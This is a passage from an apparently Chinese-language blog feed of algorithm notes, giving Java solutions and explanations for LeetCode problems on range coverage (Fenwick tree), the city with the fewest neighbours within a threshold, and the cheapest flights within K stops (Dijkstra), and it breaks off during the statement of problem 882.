end<sub>i</sub></code>&nbsp;，那么我们称整数<code>x</code>&nbsp;被覆盖了。</p><p><strong>示例 1：</strong></p><pre><b>输入：</b>ranges = [[1,2],[3,4],[5,6]], left = 2, right = 5<b>输出：</b>true<b>解释：</b>2 到 5 的每个整数都被覆盖了：- 2 被第一个区间覆盖。- 3 和 4 被第二个区间覆盖。- 5 被第三个区间覆盖。</pre><p><strong>示例 2：</strong></p><pre><b>输入：</b>ranges = [[1,10],[10,20]], left = 21, right = 21<b>输出：</b>false<b>解释：</b>21 没有被任何一个区间覆盖。</pre><p><strong>提示：</strong></p><ul>    <li><code>1 &lt;= ranges.length &lt;= 50</code></li>    <li><code>1 &lt;= start<sub>i</sub> &lt;= end<sub>i</sub> &lt;= 50</code></li>    <li><code>1 &lt;= left &lt;= right &lt;= 50</code></li></ul></div><ol><li><p>思路</p><blockquote><p>可以把两个整数 left 和 right的区间[left, right]分别拆开看做每个单独的区间[i]，取[i]在ranges区间的值是否不等于0，如果不等于0则说明ranges已覆盖。</p></blockquote></li><li><p>解题方法</p><blockquote><p>套用树状数组，对ranges里的区间range [i…j],都初始化到树状数组中，固定 add 值 1，query查询时，然后判断值是否为0。</p></blockquote></li><li><p>复杂度</p><ul><li><p>时间复杂度:</p><blockquote><p>建树的时间复杂度：跟ranges和里面的range长度、lowbit的时间有关，n最大为50，最大的时间复杂度为$O(n<em>n</em>logC)$；查询query的时间复杂度为$O(nlogC)$</p></blockquote></li><li><p>空间复杂度:</p><blockquote><p>$O(C)$</p></blockquote></li></ul></li><li><p>Code</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">// 用树状数组解答，查询区间内是否有值</span></span><br><span class="line">    <span class="type">int</span>[] tree;</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isCovered</span><span class="params">(<span class="type">int</span>[][] ranges, <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">        len = <span class="number">51</span>;</span><br><span class="line">        tree = <span class="keyword">new</span> <span class="title class_">int</span>[len];</span><br><span class="line">        <span class="comment">// 建树</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span>[] range: ranges) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">lr</span> <span class="operator">=</span> range[<span class="number">0</span>], rr = range[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">while</span>(lr &lt;= rr) &#123;</span><br><span class="line">                add(lr, <span class="number">1</span>);</span><br><span class="line">                lr++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> left; i &lt;= right; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (query(i) - query(i -<span class="number">1</span>) == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lowbit</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x &amp; -x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(index &lt; len) &#123;</span><br><span class="line">            tree[index] += <span class="number">1</span>;</span><br><span class="line">            index += lowbit(index);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">query</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            sum += tree[x];</span><br><span class="line">            x -= lowbit(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机算法 </category>
          
          <category> 树状数组 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>dijkstra，解带权重的最短路径问题（图）</title>
      <link href="/2023/11/18/dijkstra%EF%BC%8C%E8%A7%A3%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98/"/>
      <url>/2023/11/18/dijkstra%EF%BC%8C%E8%A7%A3%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>题目给出的条件为：图、路径有权值、权重无负数、求路径长度最值，可以使用 dijkstra 求 <em>出发点</em> 到其他点的 <em>最短路径</em>，记住dijkstra算法模板，直接套上用，构建一个 <code>State</code>类记录点的id和记录的最短路径长度，然后核心是最小堆，结合BFS遍历。</p><span id="more"></span><h5 id="1334-阈值距离内邻居最少的城市"><a href="#1334-阈值距离内邻居最少的城市" class="headerlink" title="1334.阈值距离内邻居最少的城市"></a>1334.阈值距离内邻居最少的城市</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/find-the-city-with-the-smallest-number-of-neighbors-at-a-threshold-distance/description/">1334. 阈值距离内邻居最少的城市</a></p></blockquote><details><summary>题目(点击展开)</summary><div class="elfjS" data-track-load="description_content"><p>有 <code>n</code>&nbsp;个城市，按从 <code>0</code> 到 <code>n-1</code>&nbsp;编号。给你一个边数组&nbsp;<code>edges</code>，其中 <code>edges[i] = [from<sub>i</sub>, to<sub>i</sub>, weight<sub>i</sub>]</code>&nbsp;代表&nbsp;<code>from<sub>i</sub></code>&nbsp;和&nbsp;<code>to<sub>i</sub></code><sub>&nbsp;</sub>两个城市之间的双向加权边，距离阈值是一个整数&nbsp;<code>distanceThreshold</code>。</p><p>返回能通过某些路径到达其他城市数目最少、且路径距离 <strong>最大</strong> 为&nbsp;<code>distanceThreshold</code>&nbsp;的城市。如果有多个这样的城市，则返回编号最大的城市。</p><p>注意，连接城市 <em><strong>i</strong></em> 和 <em><strong>j</strong></em> 的路径的距离等于沿该路径的所有边的权重之和。</p><p><strong>示例 1：</strong></p><p><img alt="" src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/01/26/find_the_city_01.png" class="lazyload" data-srcset="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/01/26/find_the_city_01.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" style="height: 225px; width: 300px;"></p><pre><strong>输入：</strong>n = 4, edges = [[0,1,3],[1,2,1],[1,3,4],[2,3,1]], distanceThreshold = 4<strong>输出：</strong>3<strong>解释：</strong>城市分布图如上。每个城市阈值距离 distanceThreshold = 4 内的邻居城市分别是：城市 0 -&gt; [城市 1, 城市 2]&nbsp;城市 1 -&gt; [城市 0, 城市 2, 城市 3]&nbsp;城市 2 -&gt; [城市 0, 城市 1, 城市 3]&nbsp;城市 3 -&gt; [城市 1, 城市 2]&nbsp;城市 0 和 3 在阈值距离 4 以内都有 2 个邻居城市，但是我们必须返回城市 3，因为它的编号最大。</pre><p><strong>示例 2：</strong></p><p><strong><img alt="" src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/01/26/find_the_city_02.png" class="lazyload" data-srcset="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/01/26/find_the_city_02.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" style="height: 225px; width: 300px;"></strong></p><pre><strong>输入：</strong>n = 5, edges = [[0,1,2],[0,4,8],[1,2,3],[1,4,2],[2,3,1],[3,4,1]], distanceThreshold = 2<strong>输出：</strong>0<strong>解释：</strong>城市分布图如上。&nbsp;每个城市阈值距离 distanceThreshold = 2 内的邻居城市分别是：城市 0 -&gt; [城市 1]&nbsp;城市 1 -&gt; [城市 0, 城市 4]&nbsp;城市 2 -&gt; [城市 3, 城市 4]&nbsp;城市 3 -&gt; [城市 2, 城市 4]城市 4 -&gt; [城市 1, 城市 2, 城市 3]&nbsp;城市 0 在阈值距离 2 以内只有 1 个邻居城市。</pre><p><strong>提示：</strong></p><ul>    <li><code>2 &lt;= n &lt;= 100</code></li>    <li><code>1 &lt;= edges.length &lt;= n * (n - 1) / 2</code></li>    <li><code>edges[i].length == 3</code></li>    <li><code>0 &lt;= from<sub>i</sub> &lt; to<sub>i</sub> &lt; n</code></li>    <li><code>1 &lt;= weight<sub>i</sub>,&nbsp;distanceThreshold &lt;= 10^4</code></li>    <li>所有 <code>(from<sub>i</sub>, to<sub>i</sub>)</code>&nbsp;都是不同的。</li></ul></div></details><ol><li><p>思路</p><blockquote><p>图，有权值，权重无负数，求路径长度，可以使用dijkstra求出发点到其他点的最短路径。</p></blockquote></li><li><p>解题方法</p><blockquote><p>核心数据结构为求起点到不超过阈值的最短路径，然后遍历所有的点，求最短路径的长度，题目为求最后一个路径长度最短的点，遍历找到即可。</p></blockquote></li><li><p>复杂度</p><ul><li><p>时间复杂度:</p><blockquote><p>$O(nlogn)$</p></blockquote></li><li><p>空间复杂度:</p></li></ul></li></ol><blockquote><p>添加空间复杂度, 示例： $O(n+m)$</p></blockquote><ol start="4"><li>Code</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span> max;</span><br><span class="line">    <span class="type">boolean</span>[] visited;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findTheCity</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span>[][] edges, <span class="type">int</span> distanceThreshold)</span> &#123;</span><br><span class="line">        max = distanceThreshold;</span><br><span class="line">        visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[n];</span><br><span class="line">        List&lt;<span class="type">int</span>[]&gt;[] graph = <span class="keyword">new</span> <span class="title class_">LinkedList</span>[n];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            graph[i] = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        &#125;        </span><br><span class="line">        <span class="comment">// 构造图</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span>[] edge: edges) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">from</span> <span class="operator">=</span> edge[<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">to</span> <span class="operator">=</span> edge[<span class="number">1</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">w</span> <span class="operator">=</span> edge[<span class="number">2</span>];</span><br><span class="line">            graph[from].add(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;to, w&#125;);</span><br><span class="line">            graph[to].add(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;from, w&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> -<span class="number">1</span>, cnt = n + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="comment">// 对每个点都做dijkstra</span></span><br><span class="line">            <span class="type">int</span>[] dist = dijkstra(i, graph);</span><br><span class="line">            <span class="type">int</span> <span class="variable">cur</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(i != j &amp;&amp; dist[j] &lt;= max) cur++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (cur &lt;= cnt) &#123;</span><br><span class="line">                cnt = cur;</span><br><span class="line">                ans = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] dijkstra(<span class="type">int</span> start, List&lt;<span class="type">int</span>[]&gt;[] graph) &#123;</span><br><span class="line">        <span class="type">int</span>[] dist = <span class="keyword">new</span> <span class="title class_">int</span>[graph.length];</span><br><span class="line">        Arrays.fill(dist, Integer.MAX_VALUE);</span><br><span class="line">        dist[start] = <span class="number">0</span>;</span><br><span class="line">        visited[start] = <span class="literal">true</span>;</span><br><span class="line">        Queue&lt;State&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((a, b) -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> a.distance - b.distance;</span><br><span class="line">        &#125;);</span><br><span class="line">        pq.offer(<span class="keyword">new</span> <span class="title class_">State</span>(start, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">while</span>(!pq.isEmpty()) &#123;</span><br><span class="line">            <span class="type">State</span> <span class="variable">cur</span> <span class="operator">=</span> pq.poll();</span><br><span class="line">            <span class="type">int</span> <span class="variable">curId</span> <span class="operator">=</span> cur.id;</span><br><span class="line">            <span class="type">int</span> <span class="variable">curDistance</span> <span class="operator">=</span> cur.distance;</span><br><span class="line">            <span class="keyword">if</span> (curDistance &gt; dist[curId] || curDistance &gt; max) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span>[] neighbor: graph[curId]) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">nextId</span> <span class="operator">=</span> neighbor[<span class="number">0</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">nextW</span> <span class="operator">=</span> dist[curId] + neighbor[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> (dist[nextId] &gt; nextW) &#123;</span><br><span class="line">                    dist[nextId] = nextW;</span><br><span class="line">                    pq.offer(<span class="keyword">new</span> <span class="title class_">State</span>(nextId, nextW));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dist;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">State</span> &#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">int</span> distance;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">State</span><span class="params">(<span class="type">int</span> _id, <span class="type">int</span> _distance)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = _id;</span><br><span class="line">        <span class="built_in">this</span>.distance = _distance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="787-K-站中转内最便宜的航班"><a href="#787-K-站中转内最便宜的航班" class="headerlink" title="787.K 站中转内最便宜的航班"></a>787.K 站中转内最便宜的航班</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/cheapest-flights-within-k-stops/description/">787. K 站中转内最便宜的航班</a></p></blockquote><div class="elfjS" data-track-load="description_content"><p>有 <code>n</code> 个城市通过一些航班连接。给你一个数组&nbsp;<code>flights</code> ，其中&nbsp;<code>flights[i] = [from<sub>i</sub>, to<sub>i</sub>, price<sub>i</sub>]</code> ，表示该航班都从城市 <code>from<sub>i</sub></code> 开始，以价格 <code>price<sub>i</sub></code> 抵达 <code>to<sub>i</sub></code>。</p><p>现在给定所有的城市和航班，以及出发城市 <code>src</code> 和目的地 <code>dst</code>，你的任务是找到出一条最多经过 <code>k</code>&nbsp;站中转的路线，使得从 <code>src</code> 到 <code>dst</code> 的 <strong>价格最便宜</strong> ，并返回该价格。 如果不存在这样的路线，则输出 <code>-1</code>。</p><p><strong>示例 1：</strong></p><pre><strong>输入:</strong> n = 3, edges = [[0,1,100],[1,2,100],[0,2,500]]src = 0, dst = 2, k = 1<strong>输出:</strong> 200<strong>解释:</strong> 城市航班图如下<img alt="" src="https://s3-lc-upload.s3.amazonaws.com/uploads/2018/02/16/995.png" class="lazyload" data-srcset="https://s3-lc-upload.s3.amazonaws.com/uploads/2018/02/16/995.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" style="height: 180px; width: 246px;">从城市 0 到城市 2 在 1 站中转以内的最便宜价格是 200，如图中红色所示。</pre><p><strong>示例 2：</strong></p><pre><strong>输入:</strong> n = 3, edges = [[0,1,100],[1,2,100],[0,2,500]]src = 0, dst = 2, k = 0<strong>输出:</strong> 500<strong>解释:</strong> 城市航班图如下<img alt="" src="https://s3-lc-upload.s3.amazonaws.com/uploads/2018/02/16/995.png" class="lazyload" data-srcset="https://s3-lc-upload.s3.amazonaws.com/uploads/2018/02/16/995.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" style="height: 180px; width: 246px;">从城市 0 到城市 2 在 0 站中转以内的最便宜价格是 500，如图中蓝色所示。</pre><p><strong>提示：</strong></p><ul>    <li><code>1 &lt;= n &lt;= 100</code></li>    <li><code>0 &lt;= flights.length &lt;= (n * (n - 1) / 2)</code></li>    <li><code>flights[i].length == 3</code></li>    <li><code>0 &lt;= from<sub>i</sub>, to<sub>i</sub> &lt; n</code></li>    <li><code>from<sub>i</sub> != to<sub>i</sub></code></li>    <li><code>1 &lt;= price<sub>i</sub> &lt;= 10<sup>4</sup></code></li>    <li>航班没有重复，且不存在自环</li>    <li><code>0 &lt;= src, dst, k &lt; n</code></li>    <li><code>src != dst</code></li></ul></div><ol><li><p>思路</p><blockquote><p>图，带权值，没有负值，求起点和终点的最短路径，可以使用dijkstra。</p></blockquote></li><li><p>解题方法</p><blockquote><p>本题的难点在：求中转航班时，可能会出现死胡同而排除掉正确的答案，比如用例<br><code>n=5，flights=[[0,1,5],[1,2,5],[0,3,2],[3,1,2],[1,4,1],[4,2,1]]，src =0，dst=2</code>,如果用默认的dijkstra框架，遇到 <code>curW &gt; dist[curId]</code>就剪枝，会把正确答案给排除掉，比如到终点的路径应该是<code>0-1-4-2</code>得7，而返回的却是<code>0-3-1-2</code>得9，在dist[1]&#x3D;4已经把[0,1,5]这个航班剪掉了，所以我们要用可以中转航班次数来作为剪枝条件，把 <code>curW &gt; dist[curId]</code> 改为 <code>curK &lt; 0</code>，然后如果遇到还有中转次数时，也要把该点入堆。</p></blockquote></li><li><p>Code</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findCheapestPrice</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span>[][] flights, <span class="type">int</span> src, <span class="type">int</span> dst, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        List&lt;<span class="type">int</span>[]&gt;[] graph = <span class="keyword">new</span> <span class="title class_">LinkedList</span>[n];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            graph[i] = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span>[] flight: flights) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">from</span>  <span class="operator">=</span> flight[<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">to</span> <span class="operator">=</span> flight[<span class="number">1</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">w</span> <span class="operator">=</span> flight[<span class="number">2</span>];</span><br><span class="line">            graph[from].add(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;to, w&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] dist = dijkstra(graph, src, dst, k);</span><br><span class="line">        <span class="keyword">return</span> dist[dst] != Integer.MAX_VALUE ? dist[dst] : -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] dijkstra(List&lt;<span class="type">int</span>[]&gt;[] graph, <span class="type">int</span> src, <span class="type">int</span> dst, <span class="type">int</span> k) &#123;</span><br><span class="line">        </span><br><span class="line">        Queue&lt;State&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((a, b) -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> a.distance - b.distance;</span><br><span class="line">        &#125;);</span><br><span class="line">        pq.offer(<span class="keyword">new</span> <span class="title class_">State</span>(src, <span class="number">0</span>, k));</span><br><span class="line">        <span class="type">int</span>[] dist = <span class="keyword">new</span> <span class="title class_">int</span>[graph.length];</span><br><span class="line">        <span class="type">int</span>[] stop = <span class="keyword">new</span> <span class="title class_">int</span>[graph.length];</span><br><span class="line">        Arrays.fill(dist, Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!pq.isEmpty()) &#123;</span><br><span class="line">            <span class="type">State</span> <span class="variable">cur</span> <span class="operator">=</span> pq.poll();</span><br><span class="line">            <span class="type">int</span> <span class="variable">curId</span> <span class="operator">=</span> cur.id;</span><br><span class="line">            <span class="type">int</span> <span class="variable">curW</span> <span class="operator">=</span> cur.distance;</span><br><span class="line">            <span class="type">int</span> <span class="variable">curK</span> <span class="operator">=</span> cur.k;</span><br><span class="line">            <span class="comment">// System.out.println(curId + &quot;,&quot; + curW + &quot;,&quot; + curDeep);</span></span><br><span class="line">            <span class="keyword">if</span> (curId == dst) &#123;</span><br><span class="line">                <span class="keyword">return</span> dist;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (curK &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span>[] neighbor: graph[curId]) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">nextId</span> <span class="operator">=</span> neighbor[<span class="number">0</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">nextW</span> <span class="operator">=</span> curW + neighbor[<span class="number">1</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">nextK</span> <span class="operator">=</span> curK - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (dist[nextId] &gt; nextW) &#123;</span><br><span class="line">                    dist[nextId] = nextW;</span><br><span class="line">                    pq.offer(<span class="keyword">new</span> <span class="title class_">State</span>(nextId, nextW, nextK));</span><br><span class="line">                    stop[nextId] = nextK;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (stop[nextId] &lt; nextK) &#123;</span><br><span class="line">                    pq.offer(<span class="keyword">new</span> <span class="title class_">State</span>(nextId, nextW, nextK));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dist;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">State</span> &#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">int</span> distance;</span><br><span class="line">    <span class="type">int</span> k;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">State</span><span class="params">(<span class="type">int</span> _id, <span class="type">int</span> _distance, <span class="type">int</span> _k)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = _id;</span><br><span class="line">        <span class="built_in">this</span>.distance = _distance;</span><br><span class="line">        <span class="built_in">this</span>.k = _k;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="882-细分图中的可到达节点"><a href="#882-细分图中的可到达节点" class="headerlink" title="882. 细分图中的可到达节点"></a>882. 细分图中的可到达节点</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/reachable-nodes-in-subdivided-graph/description/">882. 细分图中的可到达节点</a></p></blockquote><div class="elfjS" data-track-load="description_content"><p>给你一个无向图（<strong>原始图</strong>），图中有 <code>n</code> 个节点，编号从 <code>0</code> 到 <code>n - 1</code> 。你决定将图中的每条边 <strong>细分</strong> 为一条节点链，每条边之间的新节点数各不相同。</p><p>图用由边组成的二维数组 <code>edges</code> 表示，其中&nbsp;<code>edges[i] = [u<sub>i</sub>, v<sub>i</sub>, cnt<sub>i</sub>]</code> 表示原始图中节点&nbsp;<code>u<sub>i</sub></code> 和&nbsp;<code>v<sub>i</sub></code> 之间存在一条边，<code>cnt<sub>i</sub></code> 是将边 <strong>细分</strong> 后的新节点总数。注意，<code>cnt<sub>i</sub> == 0</code> 表示边不可细分。</p><p>要 <strong>细分</strong> 边 <code>[ui, vi]</code> ，需要将其替换为 <code>(cnt<sub>i</sub> + 1)</code> 条新边，和&nbsp;<code>cnt<sub>i</sub></code> 个新节点。新节点为 <code>x<sub>1</sub></code>, <code>x<sub>2</sub></code>, ..., <code>x<sub>cnt<sub>i</sub></sub></code> ，新边为 <code>[u<sub>i</sub>, x<sub>1</sub>]</code>, <code>[x<sub>1</sub>, x<sub>2</sub>]</code>, <code>[x<sub>2</sub>, x<sub>3</sub>]</code>, ..., <code>[x<sub>cnt<sub>i</sub>-1</sub>, x<sub>cnt<sub>i</sub></sub>]</code>, <code>[x<sub>cnt<sub>i</sub></sub>, v<sub>i</sub>]</code> 